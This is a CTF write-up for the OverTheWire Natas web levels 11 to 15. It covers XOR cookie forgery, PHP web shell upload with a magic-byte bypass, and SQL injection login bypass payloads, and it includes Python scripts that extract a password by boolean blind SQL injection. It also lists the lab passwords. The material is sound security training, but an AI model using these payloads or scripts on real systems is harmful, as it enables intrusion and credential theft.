---
title: overthewire&#58; natas 11 - 15
tags: web writeup
---

## Natas 11
Username: `natas11`

Password: `U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`

Url: `http://natas11.natas.labs.overthewire.org/`

This challenge has a simple input box where we can change the background color, and a view source link

![](images/Pasted image 20210312180210.png)

It also tells us the the cookies are encrypted with XOR encryption. First let me explain a little about xor encryption.

There is one famous identity about XOR which is 

A xor B = C

A xor C = B

B xor C = A

Now lets look at the source code:

![](images/Pasted image 20210317155806.png)

![](images/Pasted image 20210317155904.png)

As we can see to gain access to the next level password we need to provide a cookie where `showpassword=yes`, the cookie is encrypted with xor and we do not have the key. Also `showpassword=no` is hardcoded in the cookie meaning we can not change it from the application logic.

If we had the xor key we could simply create our own cookie with `showpassword=yes` and encrypt the cookie with our _known_ xor cookie.

From the source code we notice that the `saveData` function json encodes our cookie, then it is passed to `xor_encrypt` then it is base64 encoded. 

So our cookie (without changing the bg-color ) looks like this once decoded:
`{"showpassword":"no","bgcolor":"#ffffff"}`

We have access to our cookie by viewing the requests or installing a simple cookie manager on your browser. Meaning we know the following:

`ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D` XOR key = `{"showpassword":"no","bgcolor":"#ffffff"}`

And from the XOR identity i mentioned before we can use:

`ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D` XOR `{"showpassword":"no","bgcolor":"#ffffff"}` = key

Lets try it in cyberchef:

![](images/Pasted image 20210317160853.png)

And we have the key, again from the source code `xor_encrypt` loops over the key until the end of the cookie meaning we can see our key is `qw8J`

Lets use cyberchef again to create our own cookie with `showpassword=yes` and encrypt it with our known key (i changed the bgcolor as well to feel more 1337):

![](images/Pasted image 20210317161152.png)

Lets send this over to the challenge

![](images/Pasted image 20210317161228.png)

It worked, we got the password and our bgcolor changed ;)

___
## Natas 12
Username: `natas12`

Password: `EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`

Url: `http://natas12.natas.labs.overthewire.org/`

Browsing to the challenge site we see a simple upload functionality and a view source code link

![](images/Pasted image 20210317161331.png)

Lets upload a jpeg image to see what happens (under 1KB image). im going to open up burp suite as well as id like to repeat the requests 

Uploading a file just shows us the link to the uploaded image

![](images/Pasted image 20210317162330.png)

We also notice that our image name has changed to some random value
lets have a look at the source code.

![](images/Pasted image 20210317162451.png)

By looking at the source code we can see in the `makeRandomPath` it does not check if we provided a valid file extension (.jpg), meaning we can upload php files and gain Remote Code Execution.

We can upload a simple web shell like so:

![](images/Pasted image 20210317231825.png)

And in the filename parameter place any name with `.php` at the end. Lets upload and see what happens

By navigating to the uploaded file and providing the GET parameter `saint` as a command we can see i have successfull executed the `whoami` command:

![](images/Pasted image 20210317232014.png)

Now lets simply `cat` the natas13 password with `saint=cat /etc/natas_webpass/natas13`

___
## Natas 13
Username: `natas13`

Password: `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`

Url: `http://natas13.natas.labs.overthewire.org/`

Natas13 webpage look exactly the same as natas12 except here it states at the top of the page `For security reasons, we now only accept image files!`, lets look at the source code

![](images/Pasted image 20210317232839.png)

From the source code we see an extra layer of security being implemented, it uses the php function `exif_imagetype` to check if we are sending an image. By googling about this function we can see what it actually does.
https://www.php.net/manual/en/function.exif-imagetype.php

![](images/Pasted image 20210317233004.png)

`reads the first bytes of an image and checks its signature.`

It just reads the first bytes of the image, these are called magic bytes. Im not going to go into to much detail about this but we can simply bypass this check by providing the magic bytes at the begining of our file. Like so: 

![](images/Pasted image 20210317233615.png)

Now that function will return false, and since it uses the extension we provide all we need to do is add `.php` to the filename like the screenshot above.

Lets see if it uploads and then try and execute the `whoami` command

![](images/Pasted image 20210317233723.png)

And voila, RCE. Now like before we can read the natas14 password

___
## Natas 14
Username: `natas14`

Password: `Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`

Url: `http://natas14.natas.labs.overthewire.org/`

Here we have a login page, trying to guess some credentials gives us an access denied message, lets take a look at the source code.

![](images/Pasted image 20210317233913.png)

Here we notice a simple SQL injection point at the `query` parameter. It does not sanitize our input and just concatanates it to the query, meaning if we enter something like this as the username:
`" or 1=1;-- -` 

We can login as the first user in the database without a password.
This results as a successful login and it gives us the password for natas15

___
## Natas 15
Username: `natas15`

Password: `AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`

Url: `http://natas15.natas.labs.overthewire.org/`

This challenge looks quite interesting, all we have is a username field and it checks if the username exists in the database or not. Lets take a look at the source code.

![](images/Pasted image 20210317235258.png)

The first lines shows us that there is a `username` and a `password` column in the database. We notice we have the developer did not learn their lesson from before as we have an SQL injection in the username field again. If we enter `" or 1=1;-- -` like before we get a username exists message.

This shows us that our SQL injection worked as it found a user in the database (by providing 1=1). But what can we do with this information, since here it does not just print the password for natas16.

Well lets see if natas16 exists in the database by providing `natas16` as the username.

![](images/Pasted image 20210317235749.png)

![](images/Pasted image 20210317235756.png)

Okay so we note down that natas16 exists in the database.

Lets try `natas16" and 1=1;-- -` 

This returns `This user exists` because we have SQL injection and because 1 is always equal to 1. Now lets try  `natas16" and 1=0;-- -`

This returns `This user doesn't exist` since 1 does not equal to 0 and in boolean algebra we know that 1 and 0 is equal to 0.

This is called Boolean Blind SQL injection. We can simply ask the database what exists in the password and it will answer with a True (user exists) or False (user does not exist)

For example we could provide `natas16" and password like binary '%a%';-- -`, meaning if the letter `a` is anywhere in the password it will return True. Now we know that the letter `a` is in the natas16 password. 

If we provide `natas16" and password like binary '%b%';-- -` we get a user does not exist meaning that the letter `b` is not in the password

Here i wrote a simple python script that will check for all letters in the password, i use a for loop to go over all letters and digits and check if the response has `This user exists` in it and add that char to a variable

```py
import requests
from string import ascii_letters, digits

url = "http://natas15.natas.labs.overthewire.org/index.php"

headers = { # Header requierd to access the challenge
"Authorization":"Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="
}

letters=ascii_letters + digits
all_chars = ""

for char in letters:
	data = {
		"username":'natas16" and password like binary "%'+char+'%";-- -'
	}

	r = requests.post(url, data, headers=headers)

	if "This user exists" in r.text:
		all_chars+=char
		print(all_chars)

print("All chars in password: " + all_chars)
```

![](images/Pasted image 20210318002130.png)

These are all the chars in the password, but obviously no in the correct order. To find which place each char belongs to we can use one `%` in the sql statement like so: `natas16" and password like binary "a%";-- -`

This checks if the letter `a` is at the beginning of the password. Now our script looks something like this:

```py
import requests
from string import ascii_letters, digits

url = "http://natas15.natas.labs.overthewire.org/index.php"

headers = { # Header requierd to access the challenge
	"Authorization":"Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="
}

all_chars = "acehijmnpqtwBEHINORW03569"
password = ""

for i in range(32):
	for char in all_chars:
		data = {
		"username":'natas16" and password like binary "'+password+char+'%";-- -'
		}
		r = requests.post(url, data, headers=headers)

		if "This user exists" in r.text:
			password+=char
			print(password)
			break
```

![](images/Pasted image 20210318004529.png)

I add both scripts as one instead of two seperate

